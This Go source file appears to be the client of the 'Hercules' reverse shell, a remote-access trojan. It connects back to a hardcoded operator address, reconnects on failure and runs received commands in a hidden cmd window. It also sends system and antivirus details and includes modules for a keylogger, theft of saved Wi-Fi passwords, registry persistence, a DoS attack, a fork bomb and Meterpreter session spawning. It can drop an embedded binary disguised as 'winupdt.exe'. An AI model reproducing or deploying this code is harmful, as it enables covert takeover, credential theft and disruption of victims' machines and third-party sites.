package main

import "net"
import "os/exec"
import "bufio"
import "strings"
import "syscall"
import "time"
import "EGESPLOIT"



const IP string = "10.10.10.84"
const PORT string = "5555"

const BACKDOOR bool = false;
const EMBEDDED bool = false;
const TIME_DELAY time.Duration = 5;//Second

const B64_BINARY string = "//INSERT-BINARY-HERE//"
const BINARY_NAME string = "winupdt.exe"

var GLOBAL_COMMAND string;
var PARAMETERS string;
var KeyLogs string;



func main() {


  if EMBEDDED == true {
    EGESPLOIT.Dispatch(B64_BINARY, BINARY_NAME, PARAMETERS)
  }


  if BACKDOOR == true {
    EGESPLOIT.Persistence()
  }

  connect, err := net.Dial("tcp", IP+":"+PORT);
  if err != nil {
    time.Sleep(TIME_DELAY*time.Second);
    main();
  };



  Dir, Version, Username, AV := EGESPLOIT.Sysguide()
  SysGuide := (BANNER + "# SYSGUIDE\n" + "|" + string(Version) + "|\n|\n~> User : " + string(Username) + "\n|\n|\n~> AV : " + string(AV)  + "\n\n\n" + string(Dir) + ">")
  connect.Write([]byte(string(SysGuide)));



  for {

    Command, _ := bufio.NewReader(connect).ReadString('\n');
    _Command := string(Command);
    GLOBAL_COMMAND = _Command;



    if strings.Contains(_Command, "~please") || strings.Contains(_Command, "~PLEASE") {
      connect.Write([]byte(EGESPLOIT.Please(GLOBAL_COMMAND)));
    }else if strings.Contains(_Command, "~METERPRETER") || strings.Contains(_Command, "~meterpreter") {
      Temp_Address := strings.Split(_Command, "\"")//~meterpreter --tcp "127.0.0.1:4444"
      Address := string(Temp_Address[1])
      ConType := strings.Split(_Command, " ")
      ConType[1] = strings.TrimPrefix(ConType[1], "--")
      EGESPLOIT.Meterpreter(ConType[1], Address)
      connect.Write([]byte("\n\n[+] Meterpreter Executed !\n\n"+Dir+">"));
    }else if strings.Contains(_Command, "~MIGRATE") || strings.Contains(_Command, "~migrate") {
      Temp_Address := strings.Split(_Command, "\"")//~migrate "127.0.0.1:4444" 1212
      Address := string(Temp_Address[1])
      Pid := strings.Split(_Command, " ")
      Result, Error := EGESPLOIT.Migrate(Pid[2], Address)
      if Result == true {
          connect.Write([]byte("\n\n[+] Succesfully Migrated !\n\n"+Dir+">"));
      }else{
        connect.Write([]byte("\n\n"+Error+"\n\n"+Dir+">"));
      }
    }else if strings.Contains(_Command, "~DOS") || strings.Contains(_Command, "~dos") {
      DOS_Command := strings.Split(GLOBAL_COMMAND, "\"")
      var DOS_Target string =  DOS_Command[1]
      if strings.Contains(string(DOS_Target), "http") {
        go EGESPLOIT.Dos(DOS_Target);
        connect.Write([]byte("\n\n[*] Starting DOS atack..."+"\n\n[*] Sending 1000 request to "+DOS_Target+" !\n\n"+Dir+">"));
      }else{
        connect.Write([]byte("\n\n[-] ERROR: Invalid url !\n\n"+Dir+">"));
      }
    }else if strings.Contains(_Command, "~DISTRACT") || strings.Contains(_Command, "~distract") {
      EGESPLOIT.Distrackt();
    }else if strings.Contains(_Command, "~KEYLOGGER-DEPLOY") || strings.Contains(_Command, "~keylogger-deploy") || strings.Contains(_Command, "~Keylogger-Deploy"){
      go EGESPLOIT.Keylogger(&KeyLogs);
       connect.Write([]byte(string("\n[*] Keylogger deploy completed\n" + "\n" + string(Dir) + ">")));
    }else if strings.Contains(_Command, "~KEYLOGGER-DUMP") || strings.Contains(_Command, "~keylogger-dump") || strings.Contains(_Command, "~Keylogger-Dump"){
      Dump_Output := string("################## KEYLOGGER DUMP ##################" + "\n\n" + string(KeyLogs) + "\n####################################################" + "\n"+string(Dir)+">");
      connect.Write([]byte(Dump_Output));
    }else if strings.Contains(_Command, "~WIFI-LIST") || strings.Contains(_Command, "~wifi-list") {
      List := EGESPLOIT.WifiList();
      connect.Write([]byte(string(List)));
    }else if strings.Contains(_Command, "~HELP") || strings.Contains(_Command, "~help") {
      connect.Write([]byte(string(HELP+Dir+">")));
    }else if strings.Contains(_Command, "~PERSISTENCE") || strings.Contains(_Command, "~persistence") {
      go EGESPLOIT.Persistence();
      connect.Write([]byte("\n\n[*] Adding persistence registries...\n[*] Persistence Completed\n\n" + string(Dir) +">"));
    }else{
      cmd := exec.Command("cmd", "/C", _Command);
      cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true};
      out, _ := cmd.Output();
      Command_Output := string("\n\n"+string(out)+"\n"+string(Dir)+">");
      connect.Write([]byte(Command_Output));
    };
  };
};






var BANNER string = `
                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ /
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/


############################ HERCULES REVERSE SHELL ############################
`




var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ /
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/


############################ HERCULES REVERSE SHELL ##########################################



~PERSSISTENCE                         Installs a persistence module for continious acces

~DISTRACT                             Executes a fork bomb bat file for distraction

~PLEASE                               Asks users comfirmation for higher privilidge operations

~DOS -A "www.targetsite.com"          Starts a denial of service atack

~WIFI-LIST 						                Dumps all wifi history data with passwords

~METERPRETER --http "10.0.0.1:4444"   Creates a meterpreter connection to metasploit (http/https/tcp)

~KEYLOGGER-DEPLOY                     Installs a keylogger module and logs all keystrokes

~KEYLOGGER-DUMP                       Dumps all loged keystrokes

~MIGRATE "10.0.0.1:4444" 2222         Creates a reverse http meterpreter session at given pid (EXPERIMENTAL)


###############################################################################################

`
